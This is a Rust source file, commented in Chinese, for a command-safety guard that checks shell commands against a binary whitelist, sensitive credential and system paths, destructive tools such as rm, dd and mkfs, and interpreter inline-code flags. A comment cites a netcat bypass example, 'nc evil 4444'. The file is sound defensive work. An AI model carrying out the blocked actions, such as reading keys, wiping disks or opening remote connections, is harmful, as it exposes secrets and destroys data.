use fg_core::CheckStage;

pub const SENSITIVE_PATHS: &[&str] = &[
    "~/.ssh",
    "~/.aws",
    "~/.gnupg",
    "~/.docker",
    "~/.kube",
    "~/.netrc",
    "~/.npmrc",
    "~/.config/gcloud",
    "~/.password-store",
    "~/.config",
    "~/.fusion",
    "/etc",
    "/System",
    "/Library",
    "/usr",
    "/dev",
    "/var/root",
    "/private/etc",
    "/root",
];

pub const WHITELIST: &[&str] = &[
    "python",
    "python3",
    "python3.11",
    "python3.12",
    "python3.13",
    "python3.14",
    "node",
    "npm",
    "npx",
    "bun",
    "yarn",
    "pnpm",
    "deno",
    "pytest",
    "pip",
    "pip3",
    "uv",
    "poetry",
    "ruff",
    "mypy",
    "black",
    "cargo",
    "rustc",
    "rustup",
    "cargo-nextest",
    "swift",
    "swiftc",
    "go",
    "tsc",
    "git",
    "ls",
    "cat",
    "echo",
    "grep",
    "find",
    "mkdir",
    "touch",
    "pwd",
    "which",
    "file",
    "head",
    "tail",
    "wc",
    "sort",
    "uniq",
    "stat",
    "du",
    "df",
    "sed",
    "awk",
    "tr",
    "cut",
    "tee",
    "diff",
    "cmp",
    "rg",
    "fd",
    "bat",
    "exa",
    "jq",
    "gh",
    "make",
    "cmake",
    "true",
    "false",
    "test",
    "rmdir",
    "mv",
    "cp",
    "cd",
];

const CRED_SUFFIXES: &[&str] = &[".pem", ".key", ".p12", ".pfx", ".keystore", ".htpasswd"];

#[derive(Debug, Clone)]
pub struct TokenHit {
    pub binary: String,
    pub reason: String,
    pub stage: CheckStage,
    pub sensitive_target: bool,
}

pub fn split_chain_pub(command: &str) -> Vec<String> {
    split_chain(command)
}

pub fn basename_pub(path: &str) -> &str {
    basename(path)
}

// L4/P0-G5: 全段扫描 (不再首命中即返)。多段命令 (a; b) 各段独立判定,
// evaluate_full 收全部 hit, verdict_from_hits 取 max risk —— 避免后段 L4 被首段 L3 掩盖。
pub fn tokenize_check(content: &str) -> Vec<TokenHit> {
    let trimmed = content.trim();
    if trimmed.is_empty() {
        return Vec::new();
    }
    let mut hits = Vec::new();
    if let Some(reason) = check_shell_substitution(trimmed) {
        hits.push(TokenHit {
            binary: String::new(),
            reason,
            stage: CheckStage::Ast,
            sensitive_target: false,
        });
        return hits;
    }
    // A1: shell_words 非安全解析器 (硬伤 B) —— fail-closed 拒绝其无法建模的 shell 特性。
    // bash/zsh 会展开这些构造, shell_words 不做 (brace/tilde/glob/heredoc/|& />&N/反斜杠续行),
    // 每个未建模特性是绕过通道 (防御者用弱于执行器的语法解析)。逐文件补 arm 永不全, 统一拒。
    if let Some(reason) = check_unmodeled_shell_features(trimmed) {
        hits.push(TokenHit {
            binary: String::new(),
            reason,
            stage: CheckStage::Ast,
            sensitive_target: true,
        });
        return hits;
    }
    for segment in split_chain(trimmed) {
        let seg = segment.trim();
        if seg.is_empty() {
            continue;
        }
        if let Some(hit) = check_segment(seg) {
            hits.push(hit);
        }
    }
    hits
}

// A1 fail-closed: 引号感知扫描 shell_words 无法建模的 shell 特性。
// 仅扫未引号区域 (单/双引号内 glob/brace 是字面量, shell 不展开)。
// 命中即 Block L4 (sensitive_target=true) —— 零信任契约: 未知语法不可证明安全 = 拒。
fn check_unmodeled_shell_features(command: &str) -> Option<String> {
    let mut in_single = false;
    let mut in_double = false;
    let mut chars = command.chars().peekable();
    while let Some(ch) = chars.next() {
        if in_single {
            if ch == '\'' {
                in_single = false;
            }
            continue;
        }
        if in_double {
            if ch == '"' {
                in_double = false;
            }
            continue;
        }
        match ch {
            '\'' => in_single = true,
            '"' => in_double = true,
            // brace 展开 {a,b} 或 {n..m} —— shell_words 不建模, bash 展开为多 argv。
            // 单 {} 是 find -exec 占位符非 shell 展开, 不拒 (避免 find -exec 假阳性)。
            // 仅匹配带逗号或 .. 范围的真 brace expansion。
            '{' => {
                let rest = &command[ch.len_utf8()..];
                if let Some(close) = rest.find('}') {
                    let inner = &rest[..close];
                    if inner.contains(',') || inner.contains("..") {
                        return Some(
                            "禁止 brace 展开 {a,b}/{n..m} (shell_words 未建模, A1 fail-closed)"
                                .into(),
                        );
                    }
                }
            }
            // heredoc << / <<- —— shell_words 当重定向误析, shell 读多行字面量。
            '<' if chars.peek() == Some(&'<') => {
                return Some("禁止 heredoc <<EOF (shell_words 未建模, A1 fail-closed)".into());
            }
            // |& —— bash 管道 + stderr 合并, shell_words 当 | + & 分裂。
            '|' if chars.peek() == Some(&'&') => {
                return Some("禁止 |& 管道 (shell_words 未建模, A1 fail-closed)".into());
            }
            // >&N / <&N fd 重定向 —— shell_words 不建模 fd dup。
            '>' if chars.peek() == Some(&'&') => {
                return Some("禁止 >&N fd 重定向 (shell_words 未建模, A1 fail-closed)".into());
            }
            '<' if chars.peek() == Some(&'&') => {
                return Some("禁止 <&N fd 重定向 (shell_words 未建模, A1 fail-closed)".into());
            }
            // <> 读写打开 —— shell_words 未建模。
            '<' if chars.peek() == Some(&'>') => {
                return Some("禁止 <> 读写打开 (shell_words 未建模, A1 fail-closed)".into());
            }
            // 反斜杠续行 \ + 换行 —— shell 跨行拼接 argv, shell_words 分裂。
            '\\' if chars.peek() == Some(&'\n') => {
                return Some("禁止反斜杠续行 (shell_words 未建模, A1 fail-closed)".into());
            }
            // glob * ? [...] —— shell_words 当字面量, shell 展开为多文件 argv。
            // 仅扫未引号区域的裸 glob (路径内通配也算展开, shell 会 glob)。
            '*' | '?' => {
                return Some(format!(
                    "禁止 glob '{}' (shell_words 未建模, A1 fail-closed)",
                    ch
                ));
            }
            '[' if command[ch.len_utf8()..].contains(']') => {
                return Some("禁止 glob [...] (shell_words 未建模, A1 fail-closed)".into());
            }
            // tilde 展开 ~/ 或 裸 ~ —— shell_words 当字面量, shell 展开为 $HOME。
            // 仅独立词首 ~ (如 cd ~/secret), 非路径中段 (foo~bar 不展开)。
            '~' => {
                return Some("禁止 tilde 展开 ~ (shell_words 未建模, A1 fail-closed)".into());
            }
            _ => {}
        }
    }
    None
}

fn check_segment(segment: &str) -> Option<TokenHit> {
    if let Some(reason) = check_redirect_target(segment) {
        return Some(TokenHit {
            binary: String::new(),
            reason,
            stage: CheckStage::Ast,
            sensitive_target: true,
        });
    }
    let words = match shell_words::split(segment) {
        Ok(w) => w,
        Err(e) => {
            return Some(TokenHit {
                binary: String::new(),
                reason: format!("命令分词失败: {}", e),
                stage: CheckStage::Ast,
                sensitive_target: false,
            });
        }
    };
    if words.is_empty() {
        return None;
    }
    let mut idx = 0;
    while idx < words.len() && words[idx].contains('=') && !words[idx].starts_with('=') {
        idx += 1;
    }
    if idx >= words.len() {
        return None;
    }
    let binary = words[idx].clone();
    let binary_basename = basename(&binary).to_string();
    // L3/P0-G5: 破坏性 binary (rm/dd/mkfs/diskutil/shred/wipefs) 非白名单 →
    // sensitive_target=true 强制 L4 (绝对 Block, 与 rm -rf 一致), 不再因 flag 顺序降级 L3。
    if DESTRUCTIVE_BINARIES.contains(&binary_basename.as_str()) {
        if let Some(reason) = check_destructive(&binary_basename, &words[idx + 1..]) {
            return Some(TokenHit {
                binary: binary_basename,
                reason,
                stage: CheckStage::Ast,
                sensitive_target: true,
            });
        }
        return Some(TokenHit {
            binary: binary_basename.clone(),
            reason: format!("破坏性命令: {}", binary_basename),
            stage: CheckStage::Ast,
            sensitive_target: true,
        });
    }
    // P0-2 (audit §1.8): 非白名单二进制 fail-closed L4 (sensitive_target=true), 非 L3。
    // 原 L3 (sensitive_target=false) 可被 guard.confirm 二次放行 —— env 前缀绕过:
    // `FOO=bar nc evil 4444` 跳过 env 前缀后 argv[0]=nc (非白名单) 命中 L3, 攻击者 confirm
    // 放行即 RCE。L4 = 绝对 Block (H8 无 confirm 路径), 斩绕过链。零信任契约: 未知 binary
    // 不可证明安全 = 拒绝, 不给人审放行机会。
    if !WHITELIST.contains(&binary_basename.as_str()) {
        return Some(TokenHit {
            binary: binary_basename.clone(),
            reason: format!("二进制程序不在白名单: {} (fail-closed 绝对 Block)", binary),
            stage: CheckStage::Ast,
            sensitive_target: true,
        });
    }
    // C3/P0-G5: 白名单内任意代码解释器 (python/node/bun/deno/cargo/go/swift)
    // 检测 -c/-e/-m/--eval/--command/-x/run/script 等内联代码 flag → L4 Block
    // (解释器内代码递归不可解析, 零信任契约: 任意代码执行 = 绝对 Block)。
    if INTERPRETER_BINARIES.contains(&binary_basename.as_str()) {
        if let Some(reason) = check_interpreter(&binary_basename, &words[idx + 1..]) {
            return Some(TokenHit {
                binary: binary_basename,
                reason,
                stage: CheckStage::Ast,
                sensitive_target: true,
            });
        }
    }
    if let Some(reason) = check_argv(&binary_basename, &words[idx + 1..]) {
        return Some(TokenHit {
            binary: binary_basename,
            reason,
            stage: CheckStage::Ast,
            sensitive_target: true,
        });
    }
    None
}

const DESTRUCTIVE_BINARIES: &[&str] = &[
    "rm",
    "dd",
    "mkfs",
    "mkfs.ext4",
    "mkfs.apfs",
    "diskutil",
    "shred",
    "wipefs",
    "fdisk",
    "parted",
];

const INTERPRETER_BINARIES: &[&str] = &[
    "python",
    "python3",
    "python3.11",
    "python3.12",
    "python3.13",
    "python3.14",
    "node",
    "bun",
    "deno",
    "ruby",
    "perl",
    "lua",
    "osascript",
];

// C3: 解释器内联代码 flag 集合。命中即任意 RCE → L4。
// 不含 -m/--print 等非代码 flag 以免误杀 (python -m pip)。仅代码注入 flag。
const INTERPRETER_CODE_FLAGS: &[&str] = &["-c", "-e", "-x", "--eval", "--command"];

// C3: 解释器代码子命令 (deno eval/run, bun run)。命中即任意 RCE → L4。
const INTERPRETER_CODE_SUBCMD: &[&str] = &["eval", "run", "exec"];

// C3: 识别解释器执行内联代码的意图 (递归不可解析 → L4 绝对 Block)。
// 仅拦截明确代码注入 flag (-c/-e/--eval/--command) 与代码子命令 (eval/run/exec)。
// 不拦截无 flag 脚本路径 (python script.py) —— cargo build 类合法构建会被误杀,
// 零信任契约核心是内联代码 (零开销递归执行任意串), 显式 flag 已覆盖最致命路径。
fn check_interpreter(binary: &str, args: &[String]) -> Option<String> {
    for (i, a) in args.iter().enumerate() {
        if INTERPRETER_CODE_FLAGS.contains(&a.as_str()) {
            return Some(format!(
                "{} {} 内联代码执行 (任意 RCE, 递归不可解析 → 绝对 Block)",
                binary, a
            ));
        }
        if INTERPRETER_CODE_SUBCMD.contains(&a.as_str()) && i + 1 < args.len() {
            return Some(format!(
                "{} {} <script> 任意代码执行 → 绝对 Block",
                binary, a
            ));
        }
    }
    None
}

// L3+L4/P0-G5: 破坏性命令 arm。dd of=/dev/* → L4; rm 递归 flag 变体统一 L4。
fn check_destructive(binary: &str, args: &[String]) -> Option<String> {
    if binary == "dd" {
        for a in args {
            if let Some(target) = a.strip_prefix("of=") {
                if is_sensitive_path(target) || target.starts_with("/dev/") {
                    return Some(format!("dd of={} 磁盘/敏感设备写入 → 绝对 Block", target));
                }
            }
        }
        return None;
    }
    if binary == "rm" {
        let combined = args.join(" ");
        let has_recursive = combined.contains("-r") || combined.contains("--recursive");
        let has_force = combined.contains("-f") || combined.contains("--force");
        if has_recursive && has_force {
            return Some("rm 递归+强制 (-rf/-fr/--recursive --force 变体) → 绝对 Block".into());
        }
        if has_recursive {
            return Some("rm 递归删除 (-r/--recursive) → 绝对 Block".into());
        }
        return None;
    }
    if matches!(
        binary,
        "mkfs" | "diskutil" | "shred" | "wipefs" | "fdisk" | "parted"
    ) {
        return Some(format!("{} 磁盘/分区破坏性操作 → 绝对 Block", binary));
    }
    None
}

fn check_argv(binary: &str, args: &[String]) -> Option<String> {
    match binary {
        // L5: mv/cp 目的地解析须建模 -t DIR / --target-directory=DIR / --target-directory DIR / -- 终止符。
        // 原实现 args.rev().find(!starts_with('-')) 只取最后非 flag arg —— 漏 -t DIR 形式
        // (`mv -t /etc f` 最后非 flag 是 f 非 /etc) 且误把 -- 后 source 当 dest。
        // GNU mv: dest = -t/--target-directory 显式指定; 否则最后位置参数 (跳 flag + -- 后全位置)。
        "mv" | "cp" => {
            if let Some(dest) = parse_mv_cp_dest(args) {
                if is_sensitive_path(&dest) {
                    return Some(format!("{} 目的地位于敏感路径: {}", binary, dest));
                }
            }
            None
        }
        "sed" => {
            if args.iter().any(|a| a == "-i" || a.starts_with("-i")) {
                return Some("禁止 sed -i 原地编辑".into());
            }
            None
        }
        "find" => {
            if args
                .iter()
                .any(|a| a == "-exec" || a == "-execdir" || a == "-ok" || a == "-delete")
            {
                return Some("禁止 find -exec/-execdir/-ok/-delete 任意命令执行".into());
            }
            None
        }
        "tee" | "chmod" | "cd" => {
            for a in args.iter() {
                if a.starts_with('-') {
                    continue;
                }
                if is_sensitive_path(a) {
                    return Some(format!("{} 敏感路径: {}", binary, a));
                }
            }
            None
        }
        "cat" | "grep" | "head" | "tail" | "less" | "more" | "bat" | "rg" => {
            for a in args.iter() {
                if a.starts_with('-') {
                    continue;
                }
                if is_sensitive_path(a) {
                    return Some(format!(
                        "{} 读源位于敏感路径: {} (禁止读取私钥/系统文件)",
                        binary, a
                    ));
                }
                if is_sensitive_filename(a) {
                    return Some(format!("{} 读源为凭据文件 (敏感文件名模式): {}", binary, a));
                }
                if std::path::Path::new(a)
                    .components()
                    .any(|comp| comp == std::path::Component::ParentDir)
                {
                    return Some(format!("{} 路径含 .. 组件, 拒绝逃逸嫌疑: {}", binary, a));
                }
            }
            None
        }
        "git" => {
            for a in args.iter() {
                if a == "config" {
                    return Some("禁止 git config 持久配置后门".into());
                }
                if a == "-c" {
                    return Some("禁止 git -c 临时配置注入".into());
                }
                if a.starts_with("alias.") || a.starts_with("core.") {
                    return Some("禁止 git config alias/core 持久后门".into());
                }
            }
            None
        }
        _ => None,
    }
}

// L5: GNU mv/cp 目的地解析。优先级:
//   1. -t DIR / --target-directory DIR / --target-directory=DIR (显式指定, 短长两种接法)
//   2. 否则最后位置参数 (跳 flag 值 + -- 终止符后全位置参数)
// 返 None: 仅 source 无 dest (mv 单参, 非法命令) 或无位置参数。
// GNU 语义: -t 与最后位置参数冲突时 -t 优先 (显式 > 隐式); 多 -t 取最后 (覆盖)。
fn parse_mv_cp_dest(args: &[String]) -> Option<String> {
    let mut explicit_dest: Option<String> = None;
    let mut positionals: Vec<String> = Vec::new();
    let mut i = 0;
    let mut only_positional = false;
    let mut skip_value = false;
    while i < args.len() {
        let a = &args[i];
        if skip_value {
            skip_value = false;
            i += 1;
            continue;
        }
        if only_positional {
            positionals.push(a.clone());
            i += 1;
            continue;
        }
        if a == "--" {
            only_positional = true;
            i += 1;
            continue;
        }
        if a == "-t" {
            if i + 1 < args.len() {
                explicit_dest = Some(args[i + 1].clone());
                skip_value = true;
            }
            i += 1;
            continue;
        }
        if let Some(val) = a.strip_prefix("--target-directory=") {
            explicit_dest = Some(val.to_string());
            i += 1;
            continue;
        }
        if a == "--target-directory" {
            if i + 1 < args.len() {
                explicit_dest = Some(args[i + 1].clone());
                skip_value = true;
            }
            i += 1;
            continue;
        }
        if a.starts_with('-') && a.len() > 1 {
            i += 1;
            continue;
        }
        positionals.push(a.clone());
        i += 1;
    }
    if let Some(d) = explicit_dest {
        tracing::debug!(dest = %d, "mv/cp dest via -t/--target-directory");
        return Some(d);
    }
    if positionals.len() >= 2 {
        let d = positionals.last().cloned();
        if let Some(ref d) = d {
            tracing::debug!(dest = %d, "mv/cp dest via last positional");
        }
        d
    } else {
        None
    }
}

fn check_redirect_target(segment: &str) -> Option<String> {
    // P1: OnceLock 缓存重定向正则, 非每次 Regex::new (热路径 tokenize_check 每段都编译)。
    use std::sync::OnceLock;
    static RE: OnceLock<regex::Regex> = OnceLock::new();
    let re =
        RE.get_or_init(|| regex::Regex::new(r">\s*([^\s|&;]+)").expect("redirect regex (static)"));
    for cap in re.captures_iter(segment) {
        if let Some(target) = cap.get(1) {
            if is_sensitive_path(target.as_str()) {
                return Some(format!("重定向目标位于敏感路径: {}", target.as_str()));
            }
        }
    }
    None
}

pub fn is_sensitive_path(path: &str) -> bool {
    if !path.starts_with('/') && !path.starts_with('~') {
        return false;
    }
    let expanded = expand_tilde(path);
    for sens in SENSITIVE_PATHS {
        let sens_exp = expand_tilde(sens);
        if expanded == sens_exp || expanded.starts_with(&format!("{}/", sens_exp)) {
            return true;
        }
    }
    false
}

pub fn is_sensitive_filename(path: &str) -> bool {
    let fname = std::path::Path::new(path)
        .file_name()
        .map(|f| f.to_string_lossy().to_lowercase())
        .unwrap_or_default();
    if fname.is_empty() {
        return false;
    }
    if fname == "id_rsa" || fname.starts_with("id_rsa.") || fname.starts_with("id_rsa_") {
        return !fname.ends_with(".pub");
    }
    CRED_SUFFIXES.iter().any(|s| fname.ends_with(s))
}

fn check_shell_substitution(command: &str) -> Option<String> {
    if command.contains("$(") || command.contains('`') {
        return Some("禁止命令替换 $(...)/反引号".into());
    }
    if command.contains("<(") || command.contains("<<<") {
        return Some("禁止进程替换 <(...)/<<<".into());
    }
    None
}

fn expand_tilde(path: &str) -> String {
    if path == "~" {
        std::env::var("HOME").unwrap_or_else(|_| "~".to_string())
    } else if let Some(rest) = path.strip_prefix("~/") {
        format!("{}/{}", std::env::var("HOME").unwrap_or_default(), rest)
    } else {
        path.to_string()
    }
}

fn basename(path: &str) -> &str {
    match path.rsplit('/').next() {
        Some(s) if !s.is_empty() => s,
        _ => path,
    }
}

fn split_chain(command: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut current = String::new();
    let mut chars = command.chars().peekable();
    let mut in_single = false;
    let mut in_double = false;
    while let Some(ch) = chars.next() {
        if in_single {
            current.push(ch);
            if ch == '\'' {
                in_single = false;
            }
            continue;
        }
        if in_double {
            current.push(ch);
            if ch == '"' {
                in_double = false;
            }
            continue;
        }
        match ch {
            '\'' => {
                in_single = true;
                current.push(ch);
            }
            '"' => {
                in_double = true;
                current.push(ch);
            }
            '&' if chars.peek() == Some(&'&') => {
                chars.next();
                segments.push(std::mem::take(&mut current));
            }
            '|' if chars.peek() == Some(&'|') => {
                chars.next();
                segments.push(std::mem::take(&mut current));
            }
            ';' | '\n' | '\r' | '|' => {
                segments.push(std::mem::take(&mut current));
            }
            _ => current.push(ch),
        }
    }
    if !current.is_empty() {
        segments.push(current);
    }
    segments
}
